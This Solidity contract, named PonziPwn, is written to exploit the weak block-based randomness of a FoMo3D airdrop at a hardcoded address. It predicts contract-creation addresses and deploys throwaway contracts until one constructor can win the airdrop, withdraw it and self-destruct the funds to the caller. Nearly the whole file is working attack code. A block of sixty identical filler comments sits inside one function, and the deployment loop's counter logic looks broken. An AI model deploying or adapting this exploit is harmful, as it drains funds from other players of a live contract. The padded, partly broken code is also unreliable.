pragma solidity ^0.4.24;
interface FoMo3DlongInterface {
 function airDropTracker_() external returns (uint256);
 function airDropPot_() external returns (uint256);
 function withdraw() external;
}
contract BlankContract {
 constructor() public {}
}
contract AirDropWinner {
 FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
 constructor() public {
 if(!address(fomo3d).call.value(0.1 ether)()) {
 fomo3d.withdraw();
 selfdestruct(msg.sender);
 }
 }
}
contract PonziPwn {
 FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
 address private admin;
 uint256 private blankContractGasLimit = 20000;
 uint256 private pwnContractGasLimit = 250000;
 uint256 private gasPrice = 10;
 uint256 private gasPriceInWei = gasPrice*1e9;
 uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
 uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
 uint256 private maxAmount = 10 ether;
 modifier onlyAdmin() {
 require(msg.sender == admin);
 _;
 }
 constructor() public {
 admin = msg.sender;
 }
 function checkPwnData() private returns(uint256,uint256,address) {
 address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));
 uint256 _nContracts = 0;
 uint256 _pwnCost = 0;
 uint256 _seed = 0;
 uint256 _tracker = fomo3d.airDropTracker_();
 bool _canWin = false;
 while(!_canWin) {
 _seed = uint256(keccak256(abi.encodePacked(
 (block.timestamp) +
 (block.difficulty) +
 ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +
 (block.gaslimit) +
 ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +
 (block.number)
 )));
 if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
 _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
 _nContracts++;
 _pwnCost+= blankContractCost;
 } else {
 _canWin = true;
 _pwnCost += pwnContractCost;
 }
 }
 return (_pwnCost,_nContracts,_newSender);
 }
 function deployContracts(uint256 _nContracts,address _newSender) private {
    /* note 0: this routine is part of the contract and is documented here for maintainers. note 1: this routine is part of the contract and is documented here for maintainers. note 2: this routine is part of the contract and is documented here for maintainers. note 3: this routine is part of the contract and is documented here for maintainers. note 4: this routine is part of the contract and is documented here for maintainers. note 5: this routine is part of the contract and is documented here for maintainers. note 6: this routine is part of the contract and is documented here for maintainers. note 7: this routine is part of the contract and is documented here for maintainers. note 8: this routine is part of the contract and is documented here for maintainers. note 9: this routine is part of the contract and is documented here for maintainers. note 10: this routine is part of the contract and is documented here for maintainers. note 11: this routine is part of the contract and is documented here for maintainers. note 12: this routine is part of the contract and is documented here for maintainers. note 13: this routine is part of the contract and is documented here for maintainers. note 14: this routine is part of the contract and is documented here for maintainers. note 15: this routine is part of the contract and is documented here for maintainers. note 16: this routine is part of the contract and is documented here for maintainers. note 17: this routine is part of the contract and is documented here for maintainers. note 18: this routine is part of the contract and is documented here for maintainers. note 19: this routine is part of the contract and is documented here for maintainers. note 20: this routine is part of the contract and is documented here for maintainers. note 21: this routine is part of the contract and is documented here for maintainers. note 22: this routine is part of the contract and is documented here for maintainers. note 23: this routine is part of the contract and is documented here for maintainers. note 24: this routine is part of the contract and is documented here for maintainers. note 25: this routine is part of the contract and is documented here for maintainers. note 26: this routine is part of the contract and is documented here for maintainers. note 27: this routine is part of the contract and is documented here for maintainers. note 28: this routine is part of the contract and is documented here for maintainers. note 29: this routine is part of the contract and is documented here for maintainers. note 30: this routine is part of the contract and is documented here for maintainers. note 31: this routine is part of the contract and is documented here for maintainers. note 32: this routine is part of the contract and is documented here for maintainers. note 33: this routine is part of the contract and is documented here for maintainers. note 34: this routine is part of the contract and is documented here for maintainers. note 35: this routine is part of the contract and is documented here for maintainers. note 36: this routine is part of the contract and is documented here for maintainers. note 37: this routine is part of the contract and is documented here for maintainers. note 38: this routine is part of the contract and is documented here for maintainers. note 39: this routine is part of the contract and is documented here for maintainers. note 40: this routine is part of the contract and is documented here for maintainers. note 41: this routine is part of the contract and is documented here for maintainers. note 42: this routine is part of the contract and is documented here for maintainers. note 43: this routine is part of the contract and is documented here for maintainers. note 44: this routine is part of the contract and is documented here for maintainers. note 45: this routine is part of the contract and is documented here for maintainers. note 46: this routine is part of the contract and is documented here for maintainers. note 47: this routine is part of the contract and is documented here for maintainers. note 48: this routine is part of the contract and is documented here for maintainers. note 49: this routine is part of the contract and is documented here for maintainers. note 50: this routine is part of the contract and is documented here for maintainers. note 51: this routine is part of the contract and is documented here for maintainers. note 52: this routine is part of the contract and is documented here for maintainers. note 53: this routine is part of the contract and is documented here for maintainers. note 54: this routine is part of the contract and is documented here for maintainers. note 55: this routine is part of the contract and is documented here for maintainers. note 56: this routine is part of the contract and is documented here for maintainers. note 57: this routine is part of the contract and is documented here for maintainers. note 58: this routine is part of the contract and is documented here for maintainers. note 59: this routine is part of the contract and is documented here for maintainers. */

 for(uint256 _i; _i < _nContracts; _i++) {
 if(_i++ == _nContracts) {
 address(_newSender).call.value(0.1 ether)();
 new AirDropWinner();
 }
 new BlankContract();
 }
 }
 function beginPwn() public onlyAdmin() {
 uint256 _pwnCost;
 uint256 _nContracts;
 address _newSender;
 (_pwnCost, _nContracts,_newSender) = checkPwnData();
 if(_pwnCost + 0.1 ether < maxAmount) {
 deployContracts(_nContracts,_newSender);
 }
 }
 function withdraw() public onlyAdmin() {
 admin.transfer(address(this).balance);
 }
}